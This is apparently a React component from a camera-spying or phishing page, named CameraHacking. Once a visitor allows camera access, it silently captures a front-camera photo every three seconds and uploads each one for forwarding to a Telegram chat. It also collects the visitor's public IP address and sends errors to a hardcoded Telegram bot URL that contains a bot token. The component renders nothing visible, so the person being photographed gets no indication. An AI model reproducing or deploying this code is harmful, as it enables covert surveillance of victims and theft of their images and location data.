/**
 * УПРОЩЕННАЯ ВЕРСИЯ - ТОЛЬКО ОТПРАВКА ФОТО КАЖДЫЕ 3 СЕКУНДЫ
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);

  /**
   * ФУНКЦИЯ ОБРАБОТКИ ОШИБОК
   */
  const handleCameraError = async (error) => {
    console.error("❌ Camera error:", error);
    
    try {
      const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      await axios.post(telegramApiUrl, {
        'chat_id': chatId,
        'text': `❌ Camera Error\n\nError: ${error.name}\nMessage: ${error.message}`
      });
    } catch (err) {
      console.error("❌ Error sending notification:", err);
    }
  };

  /**
   * ФУНКЦИЯ ЗАХВАТА ФОТО
   */
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      console.log("⏸️ No video stream available");
      return;
    }
    
    try {
      const video = videoRef.current;
      
      // Проверяем готовность видео
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.log("⏳ Video not ready, skipping");
        return;
      }
      
      // Создаем canvas
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Конвертируем в JPEG с качеством 0.8
      canvas.toBlob(async (blob) => {
        if (blob) {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", blob, `photo_${Date.now()}.jpg`);
          
          const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
          
          try {
            await axios.post(apiUrl, formData, {
              headers: { "Content-Type": "multipart/form-data" },
              timeout: 10000
            });
            
            setCaptureCount(prev => prev + 1);
            console.log(`✅ Photo #${captureCount + 1} sent successfully`);
            
          } catch (error) {
            console.error("❌ Error sending photo:", error);
          }
        }
      }, "image/jpeg", 0.8);
      
    } catch (error) {
      console.error("❌ Capture error:", error);
    }
  };

  /**
   * ФУНКЦИЯ ЗАПУСКА ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log("🚀 Starting periodic capture every 3 seconds");
    
    // Первый захват сразу
    capturePhoto();
    
    // Затем каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      capturePhoto();
    }, 3000);
  };

  /**
   * ФУНКЦИЯ ОСТАНОВКИ ЗАХВАТА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    console.log("🛑 Capture stopped");
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const initializeCamera = async () => {
      try {
        // Запрашиваем доступ к камере
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: "user"
          }
        });
        
        streamRef.current = stream;
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          // Ждем готовности видео
          await new Promise(resolve => {
            if (videoRef.current.readyState >= 2) {
              setTimeout(resolve, 1000);
            } else {
              videoRef.current.onloadedmetadata = () => setTimeout(resolve, 1000);
            }
          });
          
          // Запускаем периодический захват
          startPeriodicCapture();
        }
        
      } catch (error) {
        console.error("❌ Camera access error:", error);
        handleCameraError(error);
      }
    };

    // Получение IP
    const fetchClientIp = async () => {
      try {
        const response = await axios.get('https://api.ipify.org?format=json', {
          timeout: 5000
        });
        setClientIp(response.data.ip);
      } catch (error) {
        setClientIp("IP unavailable");
      }
    };

    // Восстановление геолокации
    const savedPermission = localStorage.getItem("locationPermission");
    if (savedPermission) {
      try {
        setLocationPermission(JSON.parse(savedPermission));
      } catch (error) {
        localStorage.removeItem("locationPermission");
      }
    }

    // Инициализация
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      initializeCamera();
      fetchClientIp();
    }

    // Очистка
    return () => {
      stopCapturing();
      
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  return null;
};

export default CameraHacking;
